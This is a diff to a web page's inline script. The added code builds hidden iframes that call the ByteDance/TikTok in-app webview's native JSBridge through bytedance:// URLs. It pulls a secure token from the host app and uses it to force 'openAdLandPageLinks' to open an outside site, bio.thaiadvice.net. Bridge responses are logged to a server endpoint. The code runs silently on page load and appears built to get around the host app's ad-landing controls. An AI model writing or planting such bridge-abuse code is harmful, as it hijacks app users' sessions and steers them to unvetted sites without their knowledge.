@@ -164,28 +164,81 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
 (function(){
   if (window.location.search.indexOf('hide_nav_bar=1') !== -1) return;
 
-  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
-  var hasJSB = !!(window.JSBridge && window.JSBridge.getConfig);
-  var token = null;
   var CID = 1869709729112081;
   try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if (_uid) CID = parseInt(_uid); } catch(e){}
-  var fsUrl = 'https://ads.tiktok.com/instant_page/share/?token=9bdffa9be4247635af8190406531c623';
+  var fsUrl = 'https://bio.thaiadvice.net/';
+  var cbId = 1023;
+  var cbMap = {};
 
-  try { var _cfg = window.JSBridge && window.JSBridge.getConfig(); if (_cfg && _cfg.secure && _cfg.secure.token) token = _cfg.secure.token; } catch(e){}
-  if (!token) { try{var _m=document.cookie.match(/jsb_tok=([^;]+)/);if(_m)token=decodeURIComponent(_m[1]);}catch(e){} }
-  if (!token) token='iMA3W1dgamQv/uVdrBu5q0+X001zyZu3VIDlz8bpXWFJIl7n8xpUXmI3QkZpb1B4+eVuxqz1ghvT3+Xcv7iIS4u63E/Y1om48LxQ0E/XxyUG10G0cVwKe9HhiJXc0YqrxVMhSglWdDjP1hubzWnGD+09g7yqlE0FPWCshgsT0cmnSiiVMPEUQ0mKxjL0+Pra8vVTiTgj6UNY4rpelDNdgDVjaIWMn88V73Wg3mXUm6zmq4uG6GO8tbRSDjjjOt8lpv74LHBkOFLLPYINwr9tJB3Qp29+hHDISVf0jUoCb1T1dFhhpHh0exn+l7P3B6Ykg0I72vmgECpMvFWNR7ks82doFQ+K8cHzLS5y9NH+ew3HiG20RqzjwVz61EEhGTeeiWRKcIPInreJtGhpfyX8ObrwTwLhvIXQZN6+RVuWxL7/wMYKa3jXQ5VP1oSt2g2SviDm7hWP0pnyzbnLBb2zxeqd54YFjv5qb4pE18nnYb4sgQ7XRDOEN0kn377+6wt3fi3qlEbBjkAL5VnMvRc4DqtlN8QNHhu7tG9M9FqLidQ2RoPHGIWxvPJdz0SIn1ZEzhbElIMw/73Bb92RXt8seL1HBaXrZMtdt7kwVTIqmsBw02CtIAlX5SShXNx4hgvRgdMRYWYDSGdb8FsgaNyOFmD3hNg+0s+EpVfVqKKBXnCn4z1robpCkCJnX00ONNd22zWZ5vcCLSrwuG3rXBO0DSGEkCA/RtdtcXF0QFEUdCqVOpzW8LRqSO6hN2JP3qCK+k5dtdbP+3OxU6lNj8ieYwRvbsVwHQNGewlnn4WPJCjRYaHOZhUVQvbF/Uv7UmBpHtVAHu2ZGbwRAypGF31UGRJVBTS0EPYeFFpq0kBtV1zt5rpVZid7rDGXk3BXvDHGV8u2QKylZTlCvbywypYafA==';
+  // Create iframe bridge (bytedance:// scheme — same path Instant Page uses)
+  function mkIframe(id) {
+    var f = document.createElement('iframe');
+    f.id = id; f.style.display = 'none';
+    document.body.appendChild(f);
+    return f;
+  }
+  var dispatchFrame = mkIframe('__JSBridgeIframe_1.0__');
+  var resultFrame  = mkIframe('__JSBridgeIframe_SetResult_1.0__');
 
-  try { navigator.sendBeacon('/debug-log', 'wk='+!!wk+' jsb='+hasJSB+' tok=yes(hc) cid='+CID); } catch(e){}
+  // Listen for native response via result iframe navigation
+  resultFrame.onload = function() {
+    try {
+      var loc = resultFrame.contentWindow.location.href;
+      if (loc && loc !== 'about:blank') {
+        navigator.sendBeacon('/debug-log', 'ifr-res=' + encodeURIComponent(loc).slice(0,200));
+        var m = loc.match(/[?&]result=([^&]*)/);
+        if (m) {
+          var res = JSON.parse(decodeURIComponent(m[1]));
+          if (res && res.data && res.data.secure_token) {
+            navigator.sendBeacon('/debug-log', 'ifr-tok=got');
+            fireWithToken(res.data.secure_token);
+          }
+          if (res && res.callbackId && cbMap[res.callbackId]) {
+            cbMap[res.callbackId](res);
+          }
+        }
+      }
+    } catch(ex) { navigator.sendBeacon('/debug-log', 'ifr-err='+ex.message); }
+  };
 
-  function fire() {
-    if (!wk) return;
-    var p = {url:fsUrl, landingStyle:1, title:'', isDeeplink:1, refer:'landing_page', cid:CID};
-    if (token) p._jsb_secure_token = token;
-    try { wk.postMessage({func:'openAdLandPageLinks', params:p}); } catch(e){}
+  // Send a call through the iframe bridge
+  function ifrCall(func, params, cb) {
+    var id = cbId++;
+    if (cb) cbMap[id] = cb;
+    var msg = JSON.stringify({func: func, params: params || {}, callbackId: id});
+    try {
+      dispatchFrame.src = 'bytedance://dispatch_message/?params=' + encodeURIComponent(msg);
+    } catch(ex) {}
+    return id;
   }
 
-  fire();
-  setTimeout(fire, 1500);
+  // Also try IESPiper (WKWebView native handler)
+  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+
+  function fireWithToken(tok) {
+    var p = {url: fsUrl, landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID, _jsb_secure_token: tok};
+    if (wk) { try { wk.postMessage({func:'openAdLandPageLinks', params:p}); } catch(ex){} }
+    ifrCall('openAdLandPageLinks', p);
+  }
+
+  function fireNoToken() {
+    var p = {url: fsUrl, landingStyle: 1, title: '', isDeeplink: 1, refer: 'landing_page', cid: CID};
+    if (wk) { try { wk.postMessage({func:'openAdLandPageLinks', params:p}); } catch(ex){} }
+    ifrCall('openAdLandPageLinks', p);
+  }
+
+  // Step 1: try getConfig via iframe bridge to get token
+  ifrCall('getConfig', {}, function(res) {
+    navigator.sendBeacon('/debug-log', 'ifr-cfg=' + JSON.stringify(res).slice(0,200));
+    var tok = res && res.data && (res.data.secure_token || (res.data.secure && res.data.secure.token));
+    if (tok) fireWithToken(tok); else fireNoToken();
+  });
+
+  // Step 2: also fire immediately without token (different code path may not need it)
+  fireNoToken();
+
+  var wkHas = !!(window.JSBridge && window.JSBridge.getConfig);
+  try { navigator.sendBeacon('/debug-log', 'wk='+!!wk+' jsb='+wkHas+' ifr=fired'); } catch(e){}
 })();
 </script>
 </body>
